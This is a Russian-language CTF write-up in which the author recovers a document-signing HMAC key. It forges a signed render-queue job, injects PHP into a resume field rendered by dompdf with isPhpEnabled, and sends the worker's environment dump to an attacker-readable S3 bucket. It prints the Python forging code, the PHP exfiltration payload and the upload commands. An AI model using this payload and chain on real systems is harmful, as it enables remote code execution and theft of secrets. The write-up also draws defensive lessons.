# МёдХантер 3 — мастер-секрет подписи резюме (task21) — райтап

**Флаг:** `avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}`
**Класс:** web / cloud (dompdf RCE → S3 exfil → recover HMAC key) · **Сложность:** неизвестно · **Очки:** неизвестно · **Решило команд:** неизвестно
**Автор:** неизвестно

**Суть решения в одном абзаце.** Каждый PDF-документ МёдХантера подписывается `verification_code = HMAC-SHA256(key=PDF_SIGNING_KEY, msg=document_id)`; секрет невозможно вычислить из утёкших пар (id, код) — HMAC однонаправленный, а перебор по всем секретам, слитым в task18, ничего не дал. Зато PHP-воркер, который рендерит PDF через dompdf, запущен с `isPhpEnabled=true` и не экранирует поле резюме `experience` — значит его содержимое исполняется как PHP прямо в процессе рендера. Подделав HMAC-подпись задания очереди (ключ `mhq_v1_…`, добытый реверсом в task19) и вложив в `experience` PHP-пейлоад, который читает `getenv()` и пишет результат через уже определённую в воркере функцию `s3_request()` (используя его собственные ключи S3) в бакет `medhunter-resumes-6d6c314a` — тот же бакет, ключи от которого мы получили в task18 — мы читаем эту добычу своими кредами и находим в дампе окружения `PDF_SIGNING_KEY`, он же флаг.

---

## 1. Задача

Третья, финальная задача цепочки «МёдХантер» (портал `https://hrportal-aoa51cvc.avitoctf.ru/`). Каждый выпущенный PDF-документ получает уникальный `ID документа` и `Код проверки`, по которому работодатель отличает настоящий документ МёдХантера от подделки. По условию (`task.md`) нужно восстановить секретный ключ, которым подписывается этот код проверки, чтобы получить возможность подделать подпись для произвольного документа — восстановленный секрет и есть флаг.

Исходные гипотезы из `task.md` до начала работы: код проверки — это HMAC/JWT/подобная схема со слабым или предсказуемым секретом (перебор по словарю), либо длина-расширяющая атака на голый `md5/sha(secret‖msg)`, либо секрет утёк в уже известном .env/бандле, либо ключ можно вывести из самого `id`. Задача явно зависит от предыдущих двух: PDF-генерация (task18/task19) нужна, чтобы вообще получить пары (id, код).

## 2. Разведка

- Той же связкой SSRF→IMDSv1→IAM→`cr.yandex`, что и в task19, вытащен образ `pdf-renderer` (отдельная Yandex Cloud Function на PHP) и распакован в `task21/worker/` (`index.php`, `render.php`, `vendor/` с dompdf; сырой pull — `worker_get.out`).
- Формула кода проверки читается прямо в исходнике, `worker/index.php:191`:
  ```php
  $verificationCode = hash_hmac('sha256', $key, (string) $pdfSigningKey);
  ```
  Сигнатура PHP — `hash_hmac($algo, $data, $key)`, то есть **сообщение = `$key`** (это на самом деле `document_id`, имя переменной вводит в заблуждение), **ключ HMAC = `$pdfSigningKey`**:
  ```
  verification_code = HMAC_SHA256( key = PDF_SIGNING_KEY, msg = document_id )
  ```
- В системе **два разных секрета**, которые легко перепутать:

  | Секрет | Что подписывает | Откуда |
  |--------|-----------------|--------|
  | `RENDER_QUEUE_SIGNING_KEY` = `mhq_v1_4f8c2d9a…` | конверт задания очереди рендера: `sig = HMAC(mhq, key + "." + payload)`, проверка в `index.php:128` | найден реверсом бинаря бэкенда в task19 |
  | `PDF_SIGNING_KEY` | код проверки готового PDF — цель этой задачи | предстоит утечь |
- `index.php` в самом верху делает `require render.php`, а затем сам объявляет глобальные функции `s3_request()` / `s3_presign_get()` (SigV4-клиент Yandex Object Storage) — PHP регистрирует top-level функции на этапе парсинга файла, так что к моменту вызова `render_pdf()` они уже в области видимости всего процесса.
- `render.php:65`: `$options->set('isPhpEnabled', true)` — dompdf сконфигурирован исполнять `<script type="text/php">…</script>` внутри рендеримого HTML.
- `render.php:42-48`: `build_html()` вставляет поля резюме (`title/about/experience/skills/contact`) в HTML-heredoc сырыми, без `htmlspecialchars`.

## 3. Как мы вышли на решение (логика гипотез)

**Наблюдение 1.** Код проверки — 64 hex-символа → похоже на `sha256`/HMAC-SHA256 в hex. Прочитав исходник воркера (task19 уже дал нам доступ к образу), формула подтвердилась буквально: `hash_hmac('sha256', $key, $pdfSigningKey)`.

**Гипотеза A (дешёвая, проверяем первой): секрет уже у нас в руках.** В task18 SSRF слил `.env` бэкенда с несколькими секретами (`CALLBACK_SECRET`, `RECAPTCHA_SECRET`, `STORAGE_SECRET`). Раз задача просит «восстановить секрет», логично сначала проверить, не является ли `PDF_SIGNING_KEY` одним из уже известных — это стоило бы ноль дополнительной эксплуатации.

**Проверка.** Собрал реальные пары (`id`, `код проверки`) с боевых PDF, сгенерированных через портал (4 пары, `pairs_sorted.txt`). Написал перебор форм сообщения (id как есть/без дефисов/как raw16/uppercase, id+имя в разных разделителях) × конструкций (`hmac_sha256`, `sha256(secret+msg)`, `sha256(msg+secret)`, порядок аргументов HMAC переставлен и т.д.) × каждого из известных секретов (`brute_sig.py`, `solve_scheme.py`, `verify_sig.py`). Схема принималась верной, только если совпадала **на всех** парах разом (защита от случайного совпадения на одной).

**Результат — тупик, но информативный.** Ни одна комбинация не сошлась ни на одной паре ни для одного известного секрета. Вывод: `PDF_SIGNING_KEY` — самостоятельный секрет, не совпадающий ни с чем из task18. Раз HMAC однонаправленный, из пар (id, code) его аналитически не вытащить (не нашли и рассинхрона схемы, который позволил бы обратить функцию) — значит нужен канал **утечки**, а не подбора.

**Тупик, отвергнутый чтением кода, без отдельного теста: length-extension.** Исходная гипотеза из `task.md` предполагала классическую атаку удлинения хэша на голом `md5/sha(secret‖msg)`. Но код воркера явно использует `hash_hmac`, а не `hash('sha256', $secret.$msg)` — HMAC (двойное хеширование, вложенная конструкция `H(K⊕opad ‖ H(K⊕ipad ‖ m))`) устойчив к length-extension по конструкции. Эту ветку закрыли на уровне чтения исходника, не тратя время на пейлоады.

**Гипотеза B: раз секрет надо утечь, а мы уже знаем, что рендер — это PHP-код в облачной функции, ищем RCE в самом рендере.** Проверка исходника `render.php` подтвердила сразу два факта, которые вместе дают инъекцию: `isPhpEnabled=true` (dompdf выполнит `<script type="text/php">`) и отсутствие экранирования полей резюме в heredoc. Значит поле `experience` — прямая точка инъекции PHP-кода, если мы можем заставить воркер отрендерить резюме с нашим содержимым.

**Проверка входа: как заставить воркер отрендерить НАШЕ резюме.** `index.php:128` проверяет подпись конверта задания HMAC-ключом `RENDER_QUEUE_SIGNING_KEY`, который матчит regex `mhq_v1_[0-9a-f]{32}` — и этот ключ у нас уже есть из реверса бинаря в task19. Значит можем сами подписать произвольный JSON резюме валидным конвертом (`forge.py` подтвердил, что наша сборка `HMAC(mhq, key + "." + payload_b64)` бьётся с проверкой воркера — обычный `530`/reject не пришёл, конверт принят).

**Тупик №1 эксплуатации: пейлоад печатал секреты прямо в PDF.** Первый рабочий RCE (`exploit.py`) выводил `getenv()`-значения через `$pdf->page_text(...)` прямо на страницу генерируемого документа. Но готовый PDF уходит в **отдельный** бакет результатов под кредами `RESULTS_ACCESS_KEY`/`RESULTS_SECRET_KEY`, которых у нас нет — то есть мы не можем прочитать документ, в который сами же вписали секреты. Рабочая RCE, бесполезный канал вывода.

**Гипотеза C, закрывающая тупик №1: эксфильтровать не через сам PDF, а через уже определённую в воркере функцию `s3_request()`.** Поскольку наш PHP исполняется в том же процессе/области видимости, что и глобальные функции `index.php`, инъекция может вызвать `s3_request()` сама — с кредами `STORAGE_ACCESS_KEY`/`STORAGE_SECRET_KEY` из окружения воркера — и записать дамп `getenv()` в бакет `medhunter-resumes-6d6c314a`, тот самый, ключи от которого мы уже читаем своими (task18). Переписал пейлоад (`exploit2.py`): вместо `page_text` — `s3_request("PUT", ..., "loot/dump-<uuid>.txt", $d, ...)`.

**Тупик №2, быстро закрытый по бинарю: куда класть конверт.** Просто положить подписанный JSON в корень бакета рендер не запускает — воркер триггерится Object Storage по конкретному префиксу. В уже вытащенном в task19 бинаре бэкенда нашлась строка `incoming/`; положили конверт как `incoming/<uuid>.json` — воркер отреагировал (видно по появлению добычи в бакете чуть позже).

**Проверка гипотезы C.** Положили `exploit2.json` под `incoming/<uuid>.json` (`s3put.py`), подождали обработку, прочитали `loot/dump-<uuid>.txt` своими ключами (`s3.py`). В дампе — весь `getenv()` воркера, включая `PDF_SIGNING_KEY=avito{...}`.

**Финальная проверка (не просто «похоже на флаг», а криптографическое подтверждение).** Пересчитал `verification_code` по формуле из `index.php:191` для всех 4 реальных пар из `pairs_sorted.txt`, используя восстановленный `PDF_SIGNING_KEY` как ключ HMAC. Все 4 совпали байт-в-байт (для сравнения — ни один из секретов task18 не воспроизвёл ни одной пары в гипотезе A). Значит секрет настоящий, а не просто похожая на флаг строка в окружении.

## 4. Уязвимость (стек причин)

1. **`isPhpEnabled = true` в dompdf** (`worker/render.php:65`) — dompdf исполняет `<script type="text/php">…</script>` прямо в процессе рендера. RCE, если атакующий контролирует HTML.
2. **Нет экранирования полей резюме.** `build_html()` вставляет `title/about/experience/skills/contact` в heredoc сырыми (`render.php:42-48`, без `htmlspecialchars`). Любое поле — точка инъекции.
3. **S3-примитив записи доступен из области видимости пейлоада.** `index.php` объявляет `s3_request()`/`s3_presign_get()` как top-level функции до вызова `render_pdf()` — инжектированный PHP может вызвать их от имени воркера.
4. **Один общий бакет** (`medhunter-resumes-6d6c314a`) используется и для входящих заданий рендера, и для служебных путей вроде `loot/` — ключи от него утекли ещё в task18, поэтому воркер может положить добычу туда, куда мы уже дотягиваемся своими кредами.
5. **`PDF_SIGNING_KEY` живёт в env процесса, который умеет исполнять произвольный код.** Стойкость самого HMAC (гипотеза A это подтвердила — секрет не перебирается и не совпадает с известными) не спасает, если тот же процесс можно заставить выполнить `getenv()` и записать результат туда, куда есть доступ.

## 5. Эксплойт по шагам

1. **Убедиться, что перебор бесполезен** (мотивация RCE, не обязательный шаг для решения, но экономит время следующему): прогнать `verify_sig.py`/`solve_scheme.py`/`brute_sig.py` — все формы сообщения × все известные секреты из task18 не бьются ни с одной парой из `pairs_sorted.txt`.
2. **Подделать конверт задания очереди рендера**, используя `mhq_v1_…` из task19 (`forge.py` проверяет, что подпись бьётся с `index.php:128`):
   ```python
   MHQ = "mhq_v1_4f8c2d9a7b6e1c3055aa93df0b8e7241"
   key = str(uuid.uuid4())
   payload_b64 = base64.b64encode(json.dumps(resume, separators=(",", ":")).encode()).decode()
   sig = hmac.new(MHQ.encode(), (key + "." + payload_b64).encode(), hashlib.sha256).hexdigest()
   obj = {"key": key, "payload": payload_b64, "signature": sig}
   ```
3. **Вложить PHP-эксфил-пейлоад в поле `experience`** резюме (финальная версия, пишет через собственные S3-креды воркера — см. §3, тупик №1):
   ```php
   <script type="text/php">
   $d="";
   foreach (getenv() as $k=>$v){ $d .= $k."=".$v."\n"; }
   if (function_exists("s3_request")) {
     s3_request("PUT", getenv("STORAGE_ACCESS_KEY"), getenv("STORAGE_SECRET_KEY"),
                "medhunter-resumes-6d6c314a", "loot/dump-<uuid>.txt", $d, "text/plain"); }
   </script>
   ```
   Собрать и подписать такой конверт: `python3 exploit2.py` → `exploit2.json` (+ `exploit2_loot.txt` с итоговым путём добычи).
4. **Положить конверт под триггерящий префикс `incoming/`** своими ключами S3 из task18:
   ```
   python3 s3put.py put medhunter-resumes-6d6c314a incoming/<uuid>.json exploit2.json
   ```
   Воркер по событию: `HEAD` → `GET` → всегда `DELETE` → `decode_signed_job` (наша подпись валидна) → `render_pdf`, где dompdf исполняет наш PHP.
5. **Забрать добычу своими ключами S3**:
   ```
   python3 s3.py get medhunter-resumes-6d6c314a loot/dump-<uuid>.txt
   ```
   В дампе — `PDF_SIGNING_KEY=avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}` (плюс `RENDER_QUEUE_SIGNING_KEY`, `RESULTS_ACCESS_KEY/SECRET_KEY`, `CALLBACK_URL/SECRET`).
6. **Криптографически подтвердить ключ** — пересчитать код проверки для всех пар из `pairs_sorted.txt` восстановленным секретом и сверить байт-в-байт (см. §3, финальная проверка).

Скрипт-репродукция: `task21/exploit2.py` (см. §8) — форджит подписанный конверт задания и PHP-эксфил-пейлоад; параметры (`RENDER_QUEUE_SIGNING_KEY`, целевой бакет) читаются из окружения/CLI, а не хардкодятся. Доставка в `incoming/` и чтение `loot/` — через `s3put.py`/`s3.py` (SigV4-клиент, отдельные утилиты, не куратированы отдельно).

## 7. Выводы

1. **Стойкость HMAC не спасает, если секрет можно утечь.** Из пар (id, code) ключ не вычисляется — это подтвердил исчерпывающий перебор форм сообщения и известных секретов (§3, гипотеза A). Но RCE в компоненте, который знает секрет, обнуляет любую крипто-стойкость: правильный вопрос — не «можно ли подобрать секрет», а «что ещё умеет процесс, который его хранит».
2. **`isPhpEnabled=true` в dompdf для недоверенного HTML — прямая RCE.** Рендереры HTML→PDF никогда не должны исполнять встроенный код над пользовательскими данными; все поля должны экранироваться (`htmlspecialchars`).
3. **Разделяйте секреты и права по процессам и бакетам.** Здесь один процесс одновременно держал в `env` секрет подписи, ключи S3 и имел готовый клиент записи в бакет, доступный атакующему на чтение — цепочка «исполнил код → прочитал env → записал в бакет, который я уже читаю» замкнулась одним запросом.
4. **Провенанс всей цепочки МёдХантера — одна дыра.** Право ставить задание рендера (`mhq_v1_…`) пришло из реверса task19; ключи бакета для чтения добычи — из SSRF task18. Ни один шаг task21 не сработал бы без первых двух: одна SSRF, раскрученная до полной компрометации подписи документов.

## 8. Артефакты

- `exploit2.py` — curated PoC: форджит HMAC-подписанный конверт задания очереди рендера и PHP RCE-пейлоад, который сливает `getenv()` воркера через его собственный S3-клиент в общий бакет (ruff+ty чистый, Google-докстринг, секреты параметризованы через окружение/CLI).
- `forge.py` — минимальная проверка, что наша сборка подписи конверта (`HMAC(mhq, key+"."+payload)`) бьётся с проверкой `index.php:128`.
- `exploit.py` — первая версия RCE-пейлоада (вывод секретов прямо в PDF); зафиксирована как тупик №1 из §3 (недостижимый бакет результатов).
- `verify_sig.py`, `solve_scheme.py`, `brute_sig.py` — перебор форм сообщения × известных секретов task18 против реальных пар (id, code); зафиксированный отрицательный результат, мотивирующий переход к RCE (§3, гипотеза A).
- `s3.py`, `s3put.py` — самодельный SigV4-клиент Yandex Object Storage (GET/PUT/list) нашими ключами из task18.
- `pairs_sorted.txt` — 4 реальные пары (id, код проверки) с боевых PDF; используются и в переборе (гипотеза A), и в финальной проверке восстановленного ключа.
- `worker/index.php`, `worker/render.php` — распакованные исходники PDF-воркера (реверс образа `pdf-renderer` из task19).
- Секреты (ключи S3, значения из дампа env) — только локально, в git не коммитятся.
